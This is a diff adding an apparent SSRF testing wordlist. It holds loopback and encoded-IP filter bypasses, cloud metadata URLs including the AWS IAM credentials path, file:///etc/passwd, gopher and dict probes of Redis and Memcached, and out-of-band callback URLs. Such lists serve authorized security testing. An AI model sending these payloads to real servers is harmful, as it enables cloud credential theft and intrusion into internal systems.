@@ -1,0 +1,18 @@
+http://127.0.0.1
+http://127.0.0.1:80
+http://localhost
+http://0.0.0.0
+http://[::1]
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata.azure.com/metadata/instance?api-version=2021-02-01
+file:///etc/passwd
+gopher://127.0.0.1:6379/_INFO
+dict://127.0.0.1:11211/stats
+http://2130706433/                 # decimal 127.0.0.1
+http://0x7f000001/                 # hex 127.0.0.1
+http://127.1
+http://localtest.me
+http://burpcollaborator.net/{TOKEN}
+http://oob.{TOKEN}.samaritanx.local
